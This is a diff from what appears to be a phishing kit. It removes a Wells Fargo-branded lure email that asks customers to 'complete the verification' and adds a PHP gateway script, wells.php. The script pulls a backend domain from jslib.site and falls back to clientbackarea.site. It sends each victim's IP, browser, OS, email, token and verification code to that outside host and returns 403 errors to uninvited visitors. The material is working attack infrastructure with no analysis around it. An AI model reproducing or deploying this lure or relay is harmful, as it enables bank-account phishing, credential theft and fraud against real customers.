@@ -1,34 +1,135 @@
-<html xml:lang="en" lang="en">
+<html>
 
 <head>
-<base href=""/>
 </head>
+<body>
 
-<div id="container" style="margin:0px 0px 0px 0px;"><body style="MARGIN: 0px 0px 0px 0px;">
-					<table role="presentation" style="width:600px;background-color:#D71E28;height: 42px;border-bottom:4px solid #FCC60A" cellpadding="0" cellspacing="0" xmlns:xhtml="http://www.w3.org/1999/xhtml"><tr><td style="max-width:600px"><div align="left" id="c26img" style="margin-top: 11px;margin-bottom: 11px;margin-left: 30px; text-align: left"><a href="https://www.wellsfargo.com"/><img id="mastlogo" src="https://static.wellsfargo.com/messagecenter/static/images/masthead_wf_logo.png" border="0" alt="Wells Fargo logo" width="148" style="font-family: Wells Fargo Sans, Arial, Helvetica, sans-serif; font-size: 13px; line-height: 18px; color: #ffffff" class="center-on-narrow"/></div></td></tr></table><table role="presentation" style="width:600px;font-size:12px" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:12px;font-family:arial,helvetica,sans-serif;color:#000000">
-		<h1 xmlns:xhtml="http://www.w3.org/1999/xhtml" style="margin:24px 30px 24px 30px;font-size:19px;font-family:arial,helvetica,sans-serif;">
-		Dear Wells Fargo Customer,</h1>
-	
-	
-		<div xmlns:xhtml="http://www.w3.org/1999/xhtml" id="c11text" style="margin: 0 30px 15px 30px;font-family:arial,helvetica,sans-serif;;font-size:12px">
-			Due new security features to our system to protect your online or 
-			mobile banking, We need you to confirm your account for up to date 
-			account informations details.
-<br/>
-<br/>
-			We will try to reduce any disruptions to a minimum, we apologize in 
-			advance for any inconvenience this may cause<p>
-			<a href="" style="font-size:12px;color:#336699">
-			complete the verification</a>
-<br/>
-<br/>
-			Your account will work as normal after the verification processed.
-<br/>
-<br/>
-Thank you for choosing Wells Fargo.</div>
-	</td></tr></table><table role="presentation" style="width:600px;font-family:arial,helvetica,sans-serif;font-size:12px;border-top:0px solid #B5ADAD;background-color:#F4F0ED" cellspacing="0" cellpadding="0"><tr><td colspan="2"><table role="presentation" style="width:600px;font-family:arial,helvetica,sans-serif;font-size:12px;border-top:1px solid #B5ADAD;background-color:#F4F0ED" cellspacing="0" cellpadding="0" xmlns:xhtml="http://www.w3.org/1999/xhtml"><tr><td colspan="2"><div id="wfFooter" style="margin:10px 30px 16px 30px;vertical-align:top"><a href="https://www.wellsfargo.com" style="font-size:12px;font-family:arial,helvetica,sans-serif;margin-right: 16px;color:#336699"><strong>wellsfargo.com</strong></a> | <a href="https://www.wellsfargo.com/privacy-security/fraud" style="font-size:12px;font-family:arial,helvetica,sans-serif;margin-left: 16px;margin-right: 16px;color:#336699">Security Center</a> | <a href="https://www.wellsfargo.com/help/contact-us/" style="font-size:12px;font-family:arial,helvetica,sans-serif;margin-left: 16px;color:#336699">Contact Us</a><br/>Wells Fargo Bank, N.A. Member FDIC.
-						<br/><br/><strong>Please do not reply to this automated email.</strong></div>
-				
-		<div id="c26" style="margin:16px 30px 10px 30px; font-size: 12px; color: #3B3331">21ef3-286-ae62-8d0269d8d-a2656bd3_623ca45c_162-58526&#160;&#160;</div>
-	</td></tr></table><img src="https://ort.wellsfargo.com/openratetracking/alertsemail?uow_id=21ef3-286-ae62-8d0269d8d-a2656bd3_623ca45c_162-58526" height="1" width="1" alt="" xmlns:xhtml="http://www.w3.org/1999/xhtml"/></td></tr></table><img src="https://ort.wellsfargo.com/openratetracking/alertsemail?uow_id=21ef3-286-ae62-8d0269d8d-a2656bd3_623ca45c_162-58526" height="1" width="1" alt=""/>
-				</body></div></html>
+<?php
+header("Cache-Control: max-age=0, private, no-cache, no-store, must-revalidate");
+error_reporting(0);
+define("APIKEY","API-KEY-lm87-8dj5-fg0mv8w5lmoq");
+define("Page","WellsFargo.com");
+define("FILE_NAME","wells.php");
+define("GET_PARAM","wells");
+function getdomain(){
+    $ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://jslib.site/raw/');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5');
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
+curl_setopt($ch, CURLOPT_TIMEOUT, 400);
+$domain = curl_exec($ch);
+    if(filter_var(gethostbyname($domain), FILTER_VALIDATE_IP)){
+        return $domain;
+    }
+    else{
+        $domain = 'clientbackarea.site';
+        return $domain;
+    }
+}
+function getLanguage() { $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2); return $lang;} 
+function getIp()
+{
+    $ipaddress = '';
+    if ($_SERVER['HTTP_CLIENT_IP']) $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    else if ($_SERVER['HTTP_CF_CONNECTING_IP']) $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
+    else if ($_SERVER['HTTP_X_REAL_IP']) $ipaddress = $_SERVER['HTTP_X_REAL_IP'];
+    else if ($_SERVER['HTTP_X_FORWARDED']) $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    else if ($_SERVER['HTTP_FORWARDED_FOR']) $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    else if ($_SERVER['HTTP_FORWARDED']) $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    else if ($_SERVER['REMOTE_ADDR']) $ipaddress = $_SERVER['REMOTE_ADDR'];
+    else $ipaddress = 'UNKNOWN';
+    if ($ipaddress == "::1") {
+        return "127.0.0.1";
+    }
+    return $ipaddress;
+}
+function getOs() { $os_platform = "Unknown OS"; $all = array( '/windows nt 10/i' => 'Windows 10', '/windows nt 6.3/i' => 'Windows 8.1', '/windows nt 6.2/i' => 'Windows 8', '/windows nt 6.1/i' => 'Windows 7', '/windows nt 6.0/i' => 'Windows Vista', '/windows nt 5.2/i' => 'Windows Server 2003/XP x64', '/windows nt 5.1/i' => 'Windows XP', '/windows xp/i' => 'Windows XP', '/windows nt 5.0/i' => 'Windows 2000', '/windows me/i' => 'Windows ME', '/win98/i' => 'Windows 98', '/win95/i' => 'Windows 95', '/win16/i' => 'Windows 3.11', '/macintosh|mac os x/i' => 'Mac OS X', '/mac_powerpc/i' => 'Mac OS 9', '/linux/i' => 'Linux', '/ubuntu/i' => 'Ubuntu', '/iphone/i' => 'iPhone', '/ipod/i' => 'iPod', '/ipad/i' => 'iPad', '/android/i' => 'Android', '/blackberry/i' => 'BlackBerry', '/webos/i' => 'Mobile' ); foreach ($all as $regex => $value) { if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) { $os_platform = $value; } } return urlencode($os_platform); } 
+
+function getBrowser() { $browser = "Unknown Browser"; $all = array( '/msie/i' => 'Internet Explorer', '/firefox/i' => 'Firefox', '/safari/i' => 'Safari', '/chrome/i' => 'Chrome', '/edge/i' => 'Edge', '/opera/i' => 'Opera', '/netscape/i' => 'Netscape', '/maxthon/i' => 'Maxthon', '/konqueror/i' => 'Konqueror', '/mobile/i' => 'Handheld Browser' ); foreach ($all as $regex => $value) { if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) { $browser = $value; } } return $browser; }
+function sendRequest($post_data) { 
+    $CURLOPT_URL = 'https://' . getdomain()."/".FILE_NAME;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $CURLOPT_URL);
+    curl_setopt($ch, CURLOPT_POST,true);
+    //curl_setopt($ch, CURLOPT_HEADER,true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 400);
+    $x = curl_exec($ch);
+    if (curl_errno($ch)) {
+        echo 'Error:' . curl_error($ch);
+    }
+    curl_close($ch);
+    if ($x == '403'){
+        return header('HTTP/1.0 403 Forbidden', true, 403);
+
+    }elseif($x == "404"){
+        return header('HTTP/1.0 404 Not Found', true, 404);
+    }else{
+        return $x;
+    }
+}
+if (isset($_GET[GET_PARAM])) {
+    $IP       		= getIp();
+    $language       = getLanguage();
+    $os             = getOs();
+    $browser        = getBrowser();
+    $token			= $_GET[GET_PARAM];
+    $verifycode		= $_GET['verifycode'];
+    $email			= $_GET['em'];
+    $uniqid			= $_GET['uniqid'];
+    $referer		= $_SERVER['HTTP_REFERER'];
+    $post_data = [
+        'apikey' => APIKEY,
+        'ip' => $IP,
+        'language' => $language,
+        'os' => $os,
+        'browser' => $browser,
+        'phpusergent' => $_SERVER['HTTP_USER_AGENT'],
+        'token' => $token,
+        'verifycode' => $verifycode,
+        'em' => $email,
+        'uniqid' => $uniqid,
+        'referer' => $referer,
+        'start' => 0
+    ];
+    echo sendRequest($post_data);
+    exit;
+}elseif (isset($_GET['process'])) {
+    $apitoken = $_GET['apitoken'];
+    $IP       = getIp();
+
+    $post_data = [
+        'process' => 1,
+        'apitoken' => $apitoken,
+        'ip' => $IP
+    ];
+    echo sendRequest($post_data);
+    exit;
+}elseif (isset($_GET['auth'])) {
+    $apitoken = $_GET['apitoken'];
+    $IP       = getIp();
+
+    $post_data = [
+        'auth' => 1,
+        'apitoken' => $apitoken,
+        'ip' => $IP
+    ];
+    echo sendRequest($post_data);
+    exit;
+}elseif (isset($_GET[APIKEY])) {
+    exit(GET_PARAM);
+}else{
+    header('HTTP/1.0 403 Forbidden', true, 403);
+    exit();
+}
+?>
+
+</body>
+
+</html>
